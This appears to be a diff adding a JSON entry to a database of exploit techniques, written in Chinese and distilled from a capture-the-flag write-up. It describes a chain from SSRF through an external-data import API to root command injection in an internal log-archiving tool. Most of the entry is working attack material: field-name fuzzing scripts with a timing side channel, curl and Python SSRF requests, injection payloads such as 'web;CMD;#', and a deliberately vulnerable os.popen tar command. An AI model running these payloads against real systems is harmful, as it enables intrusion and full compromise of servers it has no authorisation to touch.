@@ -1,0 +1,62 @@
+{
+  "id": "auto-ssrf-internal-cmd-injection",
+  "title": "外部数据导入功能 SSRF 转内网工具命令注入 RCE",
+  "vuln_pattern": "业务系统的外部数据导入/数据同步接口存在参数字段名前后端不一致，绕过校验形成 SSRF，经服务发现端点拿到内网工具地址后打到内网诊断/归档工具的命令拼接点实现 root RCE。",
+  "fingerprint": [
+    "物流追踪看板",
+    "数据同步模块",
+    "外部数据导入",
+    "内网诊断工具",
+    "服务集成状态",
+    "配置纰漏",
+    "SSRF",
+    "command injection",
+    "target_endpoint",
+    "os.popen",
+    "tar command injection",
+    "field name mismatch",
+    "key fuzzing",
+    "internal service",
+    "envoy Flask"
+  ],
+  "exploit_steps": [
+    "功能测绘：枚举 /api/* 接口，重点找服务发现/状态端点（如 /api/services/status），它常直接泄露内网主机名与端口，先画出内网服务地图。",
+    "对外部导入/同步接口，抓前端 JS 请求体字段名与后端实际读取的字段名做对比；若照前端字段发请求恒返回『URL is required』类校验错误，判定为前后端字段名不一致（配置纰漏），而非值非法。",
+    "用组合生成式字典爆破真实字段名：prefix × suffix 笛卡尔积（同义词 × 命名变体，含下划线/驼峰/连字符三种拼接），逐个把值置为内网目标 URL，命中即产生真实网络请求。",
+    "过滤命中：用时间侧信道（无 IO 的纯校验恒定 3-4ms vs 真实转发 >10ms，dt>50ms 过滤）比状态码更早暴露命中；或用响应体差异（不再是校验错误文案）判定。",
+    "确认 SSRF：真实字段命中后可让服务端代请求任意内网 URL；打到服务发现暴露的内网工具端点（如日志归档 /api/internal/archive）。",
+    "命令注入：内网工具常把拼出的完整 shell 命令回显，观察命令上下文（如 tar -czf /tmp/{filename}.gz {LOG_DIR}/{service}.log），在用户可控的文件名/服务名参数注入。",
+    "构造注入 payload：service 参数用 `x;CMD;#`（# 注释掉后续拼接，回显干净）或 filename 参数用 `x;CMD;echo DONE`；容器内多以 root 跑，注入即 root，无需提权。",
+    "固化成一键 RCE 脚本复放：先 cat 源码实锤漏洞点，ls 定位 flag 目录，再读 flag。"
+  ],
+  "key_payloads": [
+    "# 服务发现拿内网地图\ncurl -s http://<TARGET>/api/services/status",
+    "# 字段名组合生成式爆破骨架\npre=['partner','sync','import','fetch','target','endpoint','source','remote',...]\nsuf=['url','endpoint','source','address','target','uri','api','name','path',...]\nkeys=set()\nfor p in pre:\n  for s in suf:\n    keys.update([f'{p}_{s}', f'{p}{s.capitalize()}', f'{p}-{s}'])\nfor k in keys:\n  t0=time.time()\n  r=requests.post('http://<TARGET>/api/import', json={k:'http://<INTERNAL_HOST>:<PORT>/<PATH>'}, timeout=12)\n  dt=(time.time()-t0)*1000\n  if 'URL is required' not in r.text or dt>50:   # 命中真实字段\n    print('[HIT]', k, dt, r.text[:150])",
+    "# SSRF 打内网工具\ncurl -s -X POST http://<TARGET>/api/import -H 'Content-Type: application/json' \\\n  -d '{\"<REAL_FIELD>\":\"http://<INTERNAL_HOST>:<PORT>/api/internal/archive?service=web&filename=test\"}'",
+    "# 命令注入（service 参数，# 注释尾巴，回显干净）\nimport urllib.parse\npayload_service='web;'+CMD+';#'\nurl='http://<INTERNAL_HOST>:<PORT>/api/internal/archive?service='+urllib.parse.quote(payload_service,safe='')+'&filename=x'\nr=requests.post('http://<TARGET>/api/import', json={'<REAL_FIELD>':url}, timeout=20)\nprint(r.json()['partner_response']['output'])",
+    "# 命令注入（filename 参数备选）\nfilename='x;'+CMD+';echo DONE'\nurl='http://<INTERNAL_HOST>:<PORT>/api/internal/archive?service=web&filename='+urllib.parse.quote(filename,safe='')",
+    "# 服务端易受攻击代码模式\ncmd = f\"tar -czf /tmp/{filename}.gz {LOG_DIR}/{service}.log 2>&1\"\nresult = os.popen(cmd).read()   # 未校验、shell 拼接",
+    "# mega-payload 快排：一次请求把全部候选 key 同时置为目标 URL，单轮批量排除\nbody = {k: 'http://<INTERNAL>:<PORT>/' for k in keys}\nr = requests.post('http://<TARGET>/api/import', json=body, timeout=15)  # 若仍是纯校验错误→全排除；有任一字段命中则响应不同"
+  ],
+  "category": "web",
+  "cve": [],
+  "tags": ["ssrf", "command-injection", "rce", "internal-service", "parameter-fuzzing", "time-side-channel", "flask", "os.popen"],
+  "source": "writeup 提炼(通用方法)",
+  "source_tier": "seed",
+  "preconditions": [
+    "存在外部数据导入/数据同步类接口，服务端会代客户端发起 HTTP 请求",
+    "存在服务发现/状态端点泄露内网服务地址与端口",
+    "前端展示的请求字段名与后端实际读取字段名可能不一致",
+    "内网工具将用户参数拼进 shell 命令且未过滤"
+  ],
+  "verify_oracle": "字段爆破命中真实字段后返回正常业务 JSON（非 URL is required 校验错误）且响应时延显著增大；命令注入后 partner_response.output 中出现 uid=0(root) 或目标文件内容回显；工具响应中 command 字段直接回显拼出的完整 shell 命令。",
+  "pitfalls": [
+    "按前端字段名打 SSRF 全部失败不代表功能不存在——是字段名不对，别在『值非法』上死磕，要转向『键名不对』。",
+    "只手工枚举少量同义词或跑通用字典(common.txt/big.txt)可能全部落空；真实字段常是组合词(target+_+endpoint)，需用生成式笛卡尔积字典。",
+    "并发压测下反代(envoy)可能返回 503 假阳性，命中需复测确认。",
+    "路径穿越(filename=../../etc/passwd)只改变 tar 输出路径、无读取价值，应直接转命令注入。",
+    "校验先于网络 IO 时状态码/文案难分辨命中，时间侧信道(有无真实网络请求的时延差)更可靠。",
+    "容器内服务常以 root 运行，注入即 root，无需再找提权。"
+  ],
+  "anti_fingerprint": []
+}
